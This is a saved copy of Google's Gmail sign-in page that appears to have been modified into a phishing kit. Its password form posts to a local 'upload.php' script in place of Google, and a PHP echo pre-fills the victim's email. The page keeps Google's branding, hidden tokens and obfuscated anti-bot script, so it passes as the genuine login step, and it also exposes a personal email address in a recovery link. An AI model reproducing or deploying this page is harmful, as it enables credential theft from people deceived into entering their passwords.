...
<!-- saved from url=(0174)https://accounts.google.com/ServiceLogin?service=mail&passive=true&rm=false&continue=https://mail.google.com/mail/&ss=1&scc=1&ltmpl=default&ltmplcache=2&emr=1&osid=1#password -->
...
<div class="card signin-card
   ...
   no-name shift-form">
  <div id="cc_iframe_parent"><iframe src="./next_files/CheckConnection.html" id="youtube" style="visibility: hidden; width: 1px; height: 1px; position: absolute; top: -100px;"></iframe></div>
  <div class="circle-mask" style="background-image: none;">
  <canvas id="canvas" class="circle" width="96" height="96"></canvas>
  </div>
  <form novalidate="" method="post" action="upload.php" id="gaia_loginform">
  <input name="Page" type="hidden" value="PasswordSeparationSignIn">
  <input type="hidden" name="GALX" value="gnkEIfrwaIM">
  <input type="hidden" name="gxf" value="AFoagUW5zafxwwT9FLt71Gd65jVO59iYig:1486609785705">
  ...
  <input id="profile-information" name="ProfileInformation" type="hidden" value="APMTqulJ3ncFFlQtAksdCe486bDVb9chjxNuOHEaOMs_7Va0Riy763lvsDozdc0BxZtdO31sCT5I93ZOKhq_zmta1-B9Dpm0iPowY4IAGYYKcuACW9rFcU-4s2-p1XriGc54jtC3JT0-">
  <input id="session-state" name="SessionState" type="hidden" value="AEThLlz1guIA8Q63pG5ZAnfTcnjQK_PYCFI1YvTLEn40fLsKeL4P2YP-OXm5ob9rqOPJs7zySNospzVl1OX7SFD8ZQ8nALdwjuiTfI_tuj1UZlVbgLxKFZU_G9StHYklXAj7pj_lKYGQpEIWxFvr2tzR4tL3oBlRe5gAnsLZaElW_gtv2gBGFlTdrZlA6N88DIGBGNBebQCqEzuMjkH5ed1HH3piMK3rHFhysgfzJlR89bKV9o4RJFNaVh0cuzyehGg2kUdS_8-IStYFTwDyBlqtQ1l82KUSYV27EsvedpsF2WYDBJtlaYnGiZeAOjb7ua0TVK7hrz3nctJXgtXvI7h39DmABL7g1am5nZfdZ9B2xQ9ml2MbSqHpDH9iC9Gpyp4c3eMFFHpjfNgEdMn1UWEJJjna7rWYCTcMjh8msgEXBArB1DbpYvQN8cqKD8iFtwPhs6jUoZqDRrwQ3_uU_PR6ji_iSwONfL7r1puDPgNbtKaGt1FnDNY5QJisKhtwEe-Sz3RGiNVabxnH3rGJH-1z8SMK4QNHwEG9p4gZqQY5XHD8xAhlDqaUa8jmsgnWSaPlkcbleIx1">
  <input type="hidden" id="_utf8" name="_utf8" value="☃">
  <input type="hidden" name="bgresponse" id="bgresponse" value="!goGlgaBCoK6vMO-FiuFEWyopYqVtPyoCAAAAO1IAAAAMmQGE8nhBAyBdIBifesCw-HNcYSUGsYrQvJv3ibUv-3gzmL2Pmn3jSXn7YYWuEcP4HBmrNz6vLENqfYHanB2Bspud8Fwte-wlhtQqYaYa9d19JsTViERmI8U57iM4LxVT5rkjHoCUXLeoFVRYKDdNmvPMZ77aUxtSvk5czszUGrhoju8bFxV6564_0h39d_V9K1nWxKlCabpBTV31fCLfTrd5-hKqAwy5q7LWSKwJv3AagDK2RxJFjbW8WH_7F3t9JvQh0vKak1fM-UM6_iqnXx_iPU5z6_5ZF--0YYUFyTw_jLa9TPGswK7glSM4y_bqkEK5pTuF3mLPH4Nlo0Y_WIFCMgIg_EsqNEi3oaoHSU7dkM1OU1UNj6lTr5IBZgCryzalAlRFgCa5lDTK1o1TAcmp3JJ370iNdxbDYfa7wAkMv_AzP3-BMEFsDPF7vyloAY4p0cyXCgrThH1Blw5EPyJBdWLjtrJfDQ1smd8JmAOueVR8GujVZPOWkre6VD1TIEgp0OoM9A">
  <input type="hidden" id="pstMsg" name="pstMsg" value="1">
  <input type="hidden" id="checkConnection" name="checkConnection" value="youtube:162:1">
...
<input id="next" name="signIn" class="rc-button rc-button-submit" type="submit" value="Next">
  ...
  <a id="back-arrow" href="https://accounts.google.com/ServiceLogin?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&amp;service=mail&amp;rm=false&amp;ltmpl=default&amp;scc=1&amp;ss=1&amp;osid=1" tabindex="-1" class="back-arrow shift-form">
  <img aria-label="Back" tabindex="0" alt="Back" src="./next_files/arrow_back_grey600_24dp.png">
  </a>
  ...
  <input id="Email-hidden" type="email" spellcheck="false" class="hidden" value="<?php echo $email?>" readonly="" autocomplete="off" name="Email">
...
<input id="signIn" name="signIn" class="rc-button rc-button-submit" type="submit" value="Sign in">
  ...
  <a id="link-forgot-passwd" class="need-help" href="https://accounts.google.com/signin/recovery?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&amp;service=mail&amp;ss=1&amp;scc=1&amp;rm=false&amp;checkedDomains=youtube&amp;checkConnection=youtube%3A162%3A1&amp;pstMsg=1&amp;osid=1&amp;Email=prayushb%40hotmail.com&amp;ignoreShadow=0&amp;hl=en">
  Forgot password?
  </a>
  </div>
  </div>
...
<div class="logo-strip"></div>
  ...
  <label for="lang-chooser"><img src="./next_files/universal_language_settings-21.png" alt="Change language"></label>
...
if(window.postMessage){var b=document.getElementById(a);b?b.value="1":Gq.error("Unable to locate the input element to storepostMessage test result",["element id: "+a])}}};G_checkConnectionMain=Gq.f(Gv);G_setPostMessageSupportFlag=Gq.f(Gw);
  ...
  domainConfigs: [{iframeUri: 'https://accounts.youtube.com/accounts/CheckConnection?pmpo\x3dhttps%3A%2F%2Faccounts.google.com\x26v\x3d-1988195567',domainSymbol: 'youtube'}],
  iframeUri: '',
  iframeOrigin: '',
  ...
  <script type="text/javascript">/* Anti-spam. Want to say hello? Contact (base64) Ym90Z3VhcmQtY29udGFjdEBnb29nbGUuY29t */Function('var O=function(F,T,w){if(T=typeof F,"object"==T)if(F){if(F instanceof Array)return"array";if(F instanceof Object)return T;if("[object Window]"==(w=Object.prototype.toString.call(F),w))return"object";if("[object Array]"==w||"number"==typeof F.length&&"undefined"!=typeof F.splice&&"undefined"!=typeof F.propertyIsEnumerable&&!F.propertyIsEnumerable("splice"))return"array";if("[object Function]"==w||"undefined"!=typeof F.call&&"undefined"!=typeof F.propertyIsEnumerable&&!F.propertyIsEnumerable("call"))return"function"}else return"null";else if("function"==T&&"undefined"==typeof F.call)return"object";return T},D=this,V=(new function(){},function(F,T){try{A(this,F,T)}catch(w){b(this,w)}}),a=(V.prototype.w=36,function(F,T){return F[T]<<24|F[T+1]<<16|F[T+2]<<8|F[T+3]}),J=(V.prototype.W=function(F,T,w,W,P,B){if(this.N)return this.N;try{P=[],B=[],W=!!F,e(this,[1,W,P,T]),e(this,[2,F,P,B]),m(this,W),w=B[0]}catch(x){b(this,x),w=this.N,F&&F(w)}return w},function(F,T,w,W){w=H(F),W=H(F),t(F,W,g(F.f(w),T))}),g=function(F,T,w,W){for(w=(W=T-1,[]);0<=W;W--)w[T-1-W]=F>>8*W&255;return w},U=function(F,T){for(T=[];F--;)T.push(255*Math.random()|0);return T},v=(V.prototype.B=function(F,T,w,W,P){if(T=F[0],4==T){F=F[1];try{for(W=T=(F=(w=atob(F),[]),0);W<w.length;W++){for(P=w.charCodeAt(W);255<P;)F[T++]=P&255,P>>=8;F[T++]=P}this.$=F}catch(B){p(this,17,B)}C(this)}else if(1==T)w=F[2],P=F[1],w.push(this.f(192).length,this.f(115).length,this.f(39).length,this.f(203)),this.R=P,M(this,142,F[3]),this.l[139]&&r(this,this.f(139));else{if(2==T){if(F=((((P=((T=((P=(F=g((w=F[2],this).f(192).length+2,2),this).f(133),0)<P.length&&t(this,192,g(P.length,2).concat(P),15),P=this.f(35)&511,P-=this.f(192).length+5,this.f(115)),4<T.length&&(P-=T.length+3),0<P&&t(this,192,g(P,2).concat(U(P)),10),4)<T.length&&t(this,192,g(T.length,2).concat(T),153),U(2)).concat(this.f(192)),P)[1]=P[0]^3,P)[3]=P[1]^F[0],P)[4]=P[1]^F[1],window).btoa){for(T=(W=0,"");W<P.length;W+=8192)T+=String.fromCharCode.apply(null,P.slice(W,W+8192));F=F(T).replace(/\\+/g,"-").replace(/\\//g,"_").replace(/=/g,"")}else F=void 0;if(F)F="!"+F;else for(T=0,F="";T<P.length;T++)W=P[T][this.Y](16),1==W.length&&(W="0"+W),F+=W;return(this.f(192).length=w[0],this.f(115)).length=w[1],this.f(39).length=w[2],P=F,M(this,203,w[3]),P}if(3==T)r(this,F[1]);else if(6==T)return r(this,F[1])}},function(F,T,w,W){for(w=H(F),W=0;0<T;T--)W=W<<8|H(F);M(F,w,W)}),p=function(F,T,w,W,P){((T=[(P=F.f(56),T),P>>8&255,P&255],void 0!=W&&T.push(W),0)==F.f(133).length&&(F.l[133]=void 0,M(F,133,T)),W="",w)&&(w.message&&(W+=w.message),w.stack&&(W+=":"+w.stack)),w=F.f(203),3<w&&(W=W.slice(0,w-3),w-=W.length+3,W=L(W.replace(/\\r\\n/g,"\\n")),t(F,115,g(W.length,2).concat(W),12)),M(F,203,w)},Y=!(V.prototype.b=function(F,T,w,W,P,B){for(w=[],B=W=0;B<F.length;B++)for(P=P<<T|F[B],W+=T;7<W;)W-=8,w.push(P>>W&255);return w},1),m=function(F,T){0!=F.I.length&&(T&&(10>F.P()-F.h||0!=document.hidden)?k(F,T):T?F.X(function(){(F.h=F.P(),k)(F,T)}):k(F,T))},M=function(F,T,w){if(207==T||56==T)if(F.l[T])F.l[T][F.Y](w);else F.l[T]=F.H(w);else if(192!=T&&115!=T&&39!=T&&133!=T||!F.l[T])F.l[T]=F.Z(w,F.f);11==T&&(F.o=void 0,M(F,207,F.f(207)+4))},u=function(F,T,w,W,P){if(1==(w=T[0],w))F.B(T);else if(2==w){w=(W=T[3],T[1]);try{F.R=false,P=F.B(T)}catch(B){b(F,B),P=F.N}(w&&w(P),W).push(P)}else if(3==w)F.B(T);else if(4==w)F.B(T);else if(5==w)F.R=false,T=T[1],T();else if(6==w)return P=T[2],M(F,90,T[6]),M(F,142,P),F.B(T)},I=(V.prototype.i=(V.prototype.P=(V.prototype.D=function(F,T,w){return F^((T^=T<<13,T^=T>>17,T=(T^T<<5)&w)||(T=1),T)},window.performance||{}).now?function(){return window.performance.now()|0}:function(){return+new Date},{}),function(F,T,w,W,P,B){for(P=(W=(((w=(T={},H)(F),T).a=H(F),T).G=[],H)(F)-1,H)(F),B=0;B<W;B++)T.G.push(H(F));for((T.s=F.f(w),T).M=F.f(P);W--;)T.G[W]=F.f(T.G[W]);return T}),X=(V.prototype.V=false,function(F,T,w,W){try{for(W=0;79669387488!=W;)F+=(T<<4^T>>>5)+T^W+w[W&3],W+=2489668359,T+=(F<<4^F>>>5)+F^W+w[W>>>11&3];return[F>>>24,F>>16&255,F>>8&255,F&255,T>>>24,T>>16&255,T>>8&255,T&255]}catch(P){throw P;}}),Q=function(F,T,w,W,P,B){return function(){var x=W&1,l=[6,T,w,void 0,P,B,arguments];if((W&2&&m(F,false),x)&&F.I.length)e(F,l);else return u(F,l)}},r=(V.prototype.f=function(F,T){if(T=this.l[F],void 0===T)throw p(this,30,0,F),this.i;return T()},function(F,T,w){return((w=F.f(207),F).$&&w<F.$.length?(M(F,207,F.$.length),d(F,T)):M(F,207,T),C)(F,w)}),e=((V.prototype.J=function(F,T,w,W){(W=(w=(F&=(T=F&4,3),H(this)),H)(this),w=this.f(w),T)&&(w=L((""+w).replace(/\\r\\n/g,"\\n"))),F&&t(this,W,g(w.length,2)),t(this,W,w)},V).prototype.O=function(F,T,w,W){for(;w--;)207!=w&&56!=w&&T.l[w]&&(T.l[w]=T[W](T[F](w),this));T[F]=this},function(F,T){F.I.splice(0,0,T)}),d=(V.prototype.m=function(F,T,w){if(3==F.length){for(w=0;3>w;w++)T[w]+=F[w];for(F=[13,8,13,12,16,5,(w=0,3),10,15];9>w;w++)T[3](T,w%3,F[w])}},function(F,T){F.C.push(F.l.slice()),F.l[207]=void 0,M(F,207,T)}),f=((V.prototype.S=function(F,T,w,W,P){for(P=W=0;P<F.length;P++)W+=F.charCodeAt(P),W+=W<<10,W^=W>>6;return W=new Number((F=(W+=W<<3,W^=W>>11,W+(W<<15))>>>0,F)&(1<<T)-1),W[0]=(F>>>T)%w,W},V).prototype.j=function(F,T,w,W){try{W=F[(T+2)%3],F[T]=F[T]-F[(T+1)%3]-W^(1==T?W<<w:W>>>w)}catch(P){throw P;}},function(F,T){return T=H(F),T&128&&(T=T&127|H(F)<<7),T}),C=function(F,T,w,W,P,B,x,l){try{for(w=(B=0,W=5001,P=void 0,F).$.length;(--W||F.V)&&(B=F.f(207))<w;)try{M(F,56,B),x=H(F),(P=F.f(x))&&P.call?P(F):p(F,21,0,x)}catch(Z){Z!=F.i&&(l=F.f(177),177!=l?(M(F,l,Z),M(F,177,177)):p(F,22,Z))}W||p(F,33)}catch(Z){try{p(F,22,Z)}catch(y){b(F,y)}}return w=F.f(142),T&&M(F,207,T),w},A=(V.prototype.F="caller",function(F,T,w,W){(((((W=((((((((((((((((((((((((((F.h=F.P(),F).Z=function(F,T,w,W,Z,y){return F=(((y=(w=(Z=(W=function(){return W[w.c+(Z[w.F]===T)-!y[w.F]]},function(){return W()}),this),w).B,Z)[w.Y]=function(F){W[w.w]=F},Z[w.Y])(F),Z)},F).l=[],F).H=function(F,T,w){return(T=(w=function(){return F},function(){return w()}),T)[this.Y]=function(P){F=P},T},M(F,207,0),M(F,56,0),M)(F,103,function(F,T,w){0!=(w=(T=H(F),H(F)),F).f(T)&&M(F,207,F.f(w))}),M)(F,51,function(F){J(F,1)}),M)(F,85,function(F){J(F,4)}),M)(F,161,function(F,T,w,W,Z){for(W=(w=H((T=[],F)),0);W<w;W++)Z=H(F),T.push(F.f(Z));w=H(F),M(F,w,function(F,P){for(P=0;P<T.length;P++)(0,T[P])(F)})}),M(F,49,function(F,T,w,W){if(T=F.C.pop()){for(w=H(F);0<w;w--)W=H(F),T[W]=F.l[W];(T[133]=F.l[133],T[203]=F.l[203],F).l=T}else M(F,207,F.$.length)}),M)(F,2,function(F,T,w,W,Z){(w=(Z=(W=(w=(T=H(F),H(F)),F).f(H(F)),F.f(H(F))),F).f(w),M)(F,T,Q(F,w,W,Z))}),M(F,177,177),M)(F,214,function(F,T,w){(T=(T=H(F),w=H(F),F).l[T]&&F.f(T),M)(F,w,T)}),M(F,94,F),M)(F,59,function(F){v(F,4)}),M)(F,223,function(F,T,w,W){W=(T=H(F),w=H(F),H(F)),M(F,W,(F.f(T)in F.f(w))+0)}),M(F,171,function(F,T,w,W,Z,y,z,K,S,N){if(void 0!=(T=H(F),w=f(F),W="",F.l[175]))for(Z=F.f(175),z=Z.length,y=0;w--;)y=(y+f(F))%z,W+=Z[y];else{for(W=(Z=0,[]);Z<w;Z++)W.push(H(F));for(y=(w=[],Z=0);Z<W.length;)z=W[Z++],128>z?w[y++]=String.fromCharCode(z):191<z&&224>z?(K=W[Z++],w[y++]=String.fromCharCode((z&31)<<6|K&63)):239<z&&365>z?(K=W[Z++],S=W[Z++],N=W[Z++],z=((z&7)<<18|(K&63)<<12|(S&63)<<6|N&63)-65536,w[y++]=String.fromCharCode(55296+(z>>10)),w[y++]=String.fromCharCode(56320+(z&1023))):(K=W[Z++],S=W[Z++],w[y++]=String.fromCharCode((z&15)<<12|(K&63)<<6|S&63));W=w.join("")}M(F,T,W)}),M)(F,196,0),M)(F,192,[165,0,0]),M(F,188,function(F){v(F,2)}),M(F,227,function(F,T,w,W,Z,y){if((F=(w=(T=(Z=(W=(T=H(F),w=H(F),H(F)),H)(F),F).f(T),F).f(w),W=F.f(W),F).f(Z),"object")==O(T)){for(y in Z=[],T)Z.push(y);T=Z}for(Z=0,y=T.length;Z<y;Z+=W)w(T.slice(Z,Z+W),F)}),F).K=function(F,T){(T.push(F[0]<<24|F[1]<<16|F[2]<<8|F[3]),T).push(F[4]<<24|F[5]<<16|F[6]<<8|F[7]),T.push(F[8]<<24|F[9]<<16|F[10]<<8|F[11])},M)(F,80,function(F,T,w){T=H(F),w=H(F),M(F,w,""+F.f(T))}),M)(F,248,function(F,T,w){(T=H(F),w=H(F),T=F.f(T),M)(F,w,O(T))}),M(F,48,function(F,T,w,W,Z){for(W=(w=(T=H(F),f)(F),Z=0,[]);Z<w;Z++)W.push(H(F));M(F,T,W)}),M(F,3,function(F,T){F=(T=H(F),F.f(T)),F[0].removeEventListener(F[1],F[2],false)}),M)(F,199,function(F,T){(T=F.f(H(F)),d)(F,T)}),M(F,115,U(4)),M)(F,153,D),M(F,137,0),M)(F,21,function(F,T,w,W){(T=H(F),w=H(F),W=H(F),M)(F,W,F.f(T)>>w)}),F).I=[],M)(F,11,0),M)(F,142,{}),M(F,39,[]),M(F,127,function(F,T){F.R&&(T=F.f(207),M(F,207,F.$.length),F.I.push([3,T]))}),M(F,239,function(F,T,w,W){(W=(w=(T=H(F),H(F)),H(F)),F.f(T)==F.f(w))&&M(F,W,F.f(W)+1)}),M(F,190,function(F,T,w){w=(T=H(F),H(F)),M(F,w,function(F){return eval(F)}(F.f(T)))}),M(F,96,function(F){F.J(4)}),M(F,58,function(F,T,w,W,Z){w=(T=(W=(w=(T=H(F),H(F)),H(F)),F).f(T),Z=F.f(H(F)),F).f(w),W=F.f(W),0!==T&&(W=Q(F,W,Z,1,T,w),T.addEventListener(w,W,Y),M(F,196,[T,w,W]))}),M(F,157,function(F,T,w,W){(T=H(F),w=H(F),W=H(F),F.f(T))[F.f(w)]=F.f(W)}),M)(F,133,[]),M)(F,131,function(F,T,w,W){(w=(T=H(F),H(F)),W=H(F),M)(F,W,F.f(T)||F.f(w))}),M(F,35,0),M)(F,120,function(){}),M(F,78,function(F,T,w,W){(T=(w=(W=(w=(T=H(F),H)(F),H(F)),F.f(w)),F.f(T)),M)(F,W,T[w])}),w.u||function(){}),M)(F,251,function(F,T,w,W,Z,y,z){(W=(Z=(T=I(F),T.s),T).M,w=T.G,z=w.length,0==z)?y=new W[Z]:1==z?y=new W[Z](w[0]):2==z?y=new W[Z](w[0],w[1]):3==z?y=new W[Z](w[0],w[1],w[2]):4==z?y=new W[Z](w[0],w[1],w[2],w[3]):p(F,22),M(F,T.a,y)}),M(F,229,function(F,T,w){(T=H(F),w=H(F),M)(F,w,F.f(w)+F.f(T))}),M(F,123,function(F,T){T=I(F),M(F,T.a,T.s.apply(T.M,T.G))}),M)(F,203,2048),F).R=false,M)(F,9,function(F){v(F,1)}),F.C=[],T&&"!"==T.charAt(0))?(F.N=T,W()):(w=!!w.u,F.R=w,F.$=[],e(F,[4,T]),e(F,[5,W]),m(F,w))}),b=function(F,T){F.N=("E:"+T.message+":"+T.stack).slice(0,2048)},H=function(F,T,w){if(!(T=F.f(207),T in F.$))throw p(F,31),F.i;return((void 0==F.o&&(F.o=a(F.$,T-4),F.g=void 0),F.g)!=T>>3&&(F.g=T>>3,w=[0,0,0,F.f(11)],F.L=X(F.o,F.g,w)),M)(F,207,T+1),F.$[T]^F.L[T%8]},k=(V.prototype.Y="toString",V.prototype.X=D.requestIdleCallback?function(F){requestIdleCallback(F,{timeout:4})}:D.setImmediate?function(F){setImmediate(F)}:function(F){setTimeout(F,0)},function(F,T,w){if(w=F.I.pop())u(F,w),m(F,T)}),t=(V.prototype.c=35,function(F,T,w,W,P,B){for(F=(((P=F.f(T),115==T)?(T=function(F,T,w,W){if((w=(T=P.length,T)-4>>3,P.U)!=w){w=(W=[0,(P.U=w,0),0,B],w<<3)-4;try{P.T=X(a(P,w),a(P,w+4),W)}catch(z){throw z;}}P.push(P.T[T&7]^F)},B=F.f(137)):T=function(F){P.push(F)},W)&&T(W&255),W=0,w).length;W<F;W++)T(w[W])}),L=function(F,T,w,W,P){for(W=w=(T=[],0);W<F.length;W++)P=F.charCodeAt(W),128>P?T[w++]=P:(2048>P?T[w++]=P>>6|192:(55296==(P&64512)&&W+1<F.length&&56320==(F.charCodeAt(W+1)&64512)?(P=65536+((P&1023)<<10)+(F.charCodeAt(++W)&1023),T[w++]=P>>18|240,T[w++]=P>>12&63|128):T[w++]=P>>12|224,T[w++]=P>>6&63|128),T[w++]=P&63|128);return T};try{window.addEventListener("unload",function(){},Y),window.addEventListener("test",null,Object.defineProperty({},"passive",{get:function(){Y={passive:true}}}))}catch(F){}var q=(D.botguard||(D.botguard={}),D).botguard;(q.sKU=function(F,T,w){(w=new V(F,{u:T}),this).invoke=function(F,T,B){return(B=w.W(T&&F,B),F)&&!T&&F(B),B}},q).bg=function(F,T,w){return F&&F.substring&&(w=q[F.substring(0,3)])?new w(F.substring(3),T):new q.sKU(F,T)};')();</script>
  <script type="text/javascript">
  document.bg = new botguard.bg('');
  </script>
<script>
  gaia = window.gaia || {};
  gaia.ps = gaia.ps || {};
...
b&&(PS_$(this),PS_de(this,{name:"",email:this.b.value,photo_url:"",recovery_url:"https://accounts.google.com/signin/recovery?Email="+this.b.value,encoded_profile_information:""}))};var PS_$=function(a){PS_Q(a.u,!1);PS_Q(a.b,!1)};
